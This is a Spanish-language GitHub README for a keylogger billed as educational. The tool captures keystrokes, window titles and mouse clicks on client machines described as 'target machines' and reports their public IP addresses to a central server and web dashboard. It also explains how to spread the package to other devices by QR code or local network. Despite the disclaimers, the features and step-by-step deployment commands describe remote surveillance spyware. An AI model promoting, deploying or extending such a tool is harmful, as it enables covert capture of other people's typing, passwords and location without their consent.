# 🌐 Keylogger Educativo con Sistema Remoto

> **Sistema avanzado de keylogger con servidor centralizado que obtiene IPs públicas reales de múltiples clientes**

[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS%20|%20Linux-lightgrey.svg)](https://github.com)

> **⚠️ SOLO PARA USO EDUCATIVO Y SISTEMAS PROPIOS**  
> Este proyecto es únicamente con fines educativos. El uso indebido puede ser ilegal.

## 🎯 **Características Principales**

### 🔥 **IP Pública Real**
- ❌ **NO** muestra IPs locales inútiles (`192.168.1.x`)
- ✅ **SÍ** muestra la **IP pública real** de cada máquina (`198.12.34.56`)
- 🌍 Permite geolocalización e identificación única

### 🌐 **Sistema Cliente-Servidor**
- �️ **Servidor Central** - Recibe múltiples keyloggers desde tu máquina
- 📱 **Cliente Remoto** - Se instala en máquinas objetivo
- 📊 **Panel Web** - Monitoreo en tiempo real en `http://localhost:5000`

### ⚡ **Configuración Súper Fácil**
```bash
# 1️⃣ Configuración automática (una sola vez)
python3 setup_remote.py

# 2️⃣ En tu máquina (servidor)
python3 start_server.py

# 3️⃣ En máquinas objetivo (cliente) 
python3 start_client.py
```

### 📁 **Organización Perfecta**
```
keylogger-educativo/
├── 📁 src/          → Código principal del keylogger
├── 📁 web/          → Dashboard web con gráficos
├── 📁 utils/        → Herramientas de transferencia
├── 📁 logs/         → Datos capturados (auto-creado)
├── 📁 docs/         → Documentación completa
└── 🚀 main.py       → ¡EJECUTA ESTE ARCHIVO!
```

### 🔐 **Seguridad y Privacidad**
- 🔒 **Encriptación AES** de todos los datos
- 🔑 **Claves únicas** por instalación
- 📄 **Archivos legibles** para análisis
- 🗂️ **Organización automática** de logs

## 📱 Capturas de Pantalla

### Interfaz Principal
```
╔═══════════════════════════════════════════════════════════════╗
║            🚀 KEYLOGGER EDUCATIVO - LAUNCHER 🚀               ║
║                   TODO EN UNO - FÁCIL USO                    ║
╚═══════════════════════════════════════════════════════════════╝

🎯 CARACTERÍSTICAS PRINCIPALES:
├── 📝 CAPTURA EN TIEMPO REAL - Ve exactamente lo que se escribe
├── 🔍 VISUALIZACIÓN CLARA - Datos organizados y legibles  
├── 📊 ANÁLISIS COMPLETO - Estadísticas detalladas
├── 🌐 DASHBOARD WEB - Interfaz gráfica moderna
└── 🔐 ENCRIPTACIÓN SEGURA - Datos protegidos
```

### Captura en Tiempo Real
```
📝 TEXTO CAPTURADO (ÚLTIMOS 500 CARACTERES):
╔══════════════════════════════════════════════════════════════╗
║ Hola mundo, esto es una prueba del keylogger educativo      ║
║ Puedes ver exactamente lo que se escribe en tiempo real     ║
║ Las estadísticas se actualizan automáticamente              ║
╚══════════════════════════════════════════════════════════════╝

📈 Estadísticas Actuales:
├── ⌨️  Teclas presionadas: 342
├── 📝 Palabras escritas: 67
├── 🖱️  Clicks de mouse: 15
└── ⏱️  Tiempo activo: 00:05:23
```

## ⚡ Inicio Rápido

### 1. Clonar el Repositorio
```bash
git clone https://github.com/tu-usuario/keylogger-educativo.git
cd keylogger-educativo
```

### 2. Ejecutar (Auto-instala dependencias)
```bash
python3 main.py
```

### 3. Seleccionar Opción
- **Opción 1**: Keylogger Visual (captura en tiempo real)
- **Opción 2**: Ver datos capturados (análisis completo)
- **Opción 3**: Captura rápida (prueba de 2 minutos)

## 🎮 Uso Detallado

### 🔥 Keylogger Visual
El modo principal que muestra **TODO EN TIEMPO REAL**:
- Ve cada tecla presionada
- Muestra el texto completo conforme se escribe
- Estadísticas actualizadas cada 2 segundos
- Detección automática de cambios de ventana

### 📊 Visor de Datos
Análisis completo de todo lo capturado:
- **Archivo legible**: Texto plano fácil de leer
- **Datos estructurados**: JSON con timestamps
- **Estadísticas**: Resumen de actividad
- **Texto limpio**: Solo el contenido escrito

### 🌐 Dashboard Web
```bash
python3 main.py → Opción 4
# Visita: http://localhost:5000
```
- Gráficos interactivos
- Estadísticas por hora
- Mapas de calor de actividad
- Auto-actualización cada 30 segundos

## 📁 Archivos Generados

### En `/logs/`:
- **`readable_output.txt`** - Todo en formato legible
- **`captured_data.json`** - Datos encriptados estructurados
- **`texto_limpio.txt`** - Solo el texto escrito
- **`encryption.key`** - Clave de encriptación

### Ejemplo de `readable_output.txt`:
```
========================================
KEYLOGGER EDUCATIVO - CAPTURA DE SESIÓN
Inicio: 2025-09-10 14:30:15
========================================

[2025-09-10 14:30:20] VENTANA: Visual Studio Code
[2025-09-10 14:30:22] TEXTO ESCRITO: Hola mundo
[2025-09-10 14:30:25] TEXTO ESCRITO: esto es una prueba
[2025-09-10 14:30:28] MOUSE: Click Button.left en (450, 300)
```

## 🛠️ Instalación Manual

Si prefieres instalar paso a paso:

### 1. Dependencias
```bash
pip install cryptography pynput psutil flask flask-cors qrcode pillow
```

### 2. Permisos (macOS)
1. Ve a **Configuración del Sistema** → **Privacidad y Seguridad**
2. Busca **"Accesibilidad"**
3. Añade **Terminal** (o tu editor) a la lista
4. Marca la casilla para habilitarlo

### 3. Ejecutar
```bash
python3 main.py
```

## 🌐 Transferir a Otros Dispositivos

### Método 1: Código QR
```bash
python3 main.py → Opción 6 → Transfer Utility
```
1. Crea paquete automático
2. Genera código QR
3. Escanea con tu móvil
4. Descarga e instala

### Método 2: Red Local
1. El transfer utility muestra una IP (ej: `192.168.1.100:8888`)
2. Ve a esa dirección en tu otro dispositivo
3. Descarga el archivo ZIP
4. Extrae y ejecuta `python3 main.py`

## 📊 Casos de Uso Educativos

### 🎓 **Para Estudiantes**
- Aprender sobre APIs del sistema
- Entender captura de eventos
- Práctica de encriptación
- Desarrollo de interfaces

### 🔒 **Seguridad Informática**
- Demostrar riesgos de keyloggers
- Enseñar detección de malware
- Análisis de comportamiento
- Auditorías de sistemas propios

### 📈 **Análisis Personal**
- Medir productividad propia
- Estudiar patrones de escritura
- Identificar apps más usadas
- Análisis de tiempo de trabajo

## ⚖️ Uso Ético y Legal

### ✅ **PERMITIDO:**
- ✅ Uso en equipos **propios**
- ✅ Fines **educativos**
- ✅ **Investigación** académica
- ✅ **Auditorías** de seguridad propias
- ✅ **Aprendizaje** de programación

### ❌ **PROHIBIDO:**
- ❌ Instalación **sin consentimiento**
- ❌ Violación de **privacidad**
- ❌ Uso **comercial** sin licencia
- ❌ Actividades **ilegales**
- ❌ Espionaje **no autorizado**

## 🔧 Solución de Problemas

### Error: "This process is not trusted"
**Solución (macOS):**
1. Sistema → Privacidad y Seguridad → Accesibilidad
2. Añadir Terminal/VS Code a la lista
3. Reiniciar la aplicación

### Error: Dependencias faltantes
```bash
python3 main.py → Opción 7 (Instalar dependencias)
```

### Puerto 5000 ocupado (Dashboard)
Edita `web/dashboard.py` línea final:
```python
app.run(debug=True, host='0.0.0.0', port=5001)  # Cambiar puerto
```

## 🤝 Contribuir

¿Quieres mejorar el proyecto?

1. **Fork** el repositorio
2. **Crea** una rama: `git checkout -b nueva-caracteristica`
3. **Commit** cambios: `git commit -m 'Añadir nueva característica'`
4. **Push**: `git push origin nueva-caracteristica`
5. **Abre** un Pull Request

### Ideas para contribuir:
- 🌍 Soporte para más idiomas
- 📱 App móvil de control
- 🤖 Análisis con IA
- 📊 Más tipos de gráficos
- 🔍 Detección de patrones

## 📄 Licencia

Este proyecto es para **fines educativos únicamente**.

**Autor:** Alvaro Manzo  
**Año:** 2025  
**Propósito:** Educación en seguridad informática

---

## 🌟 ¿Te gustó el proyecto?

- ⭐ **Dale una estrella** en GitHub
- 🐛 **Reporta bugs** en Issues
- 💡 **Sugiere mejoras**
- 🤝 **Comparte** con fines educativos

**⚠️ Recuerda: Con gran poder viene gran responsabilidad. Úsalo éticamente.**
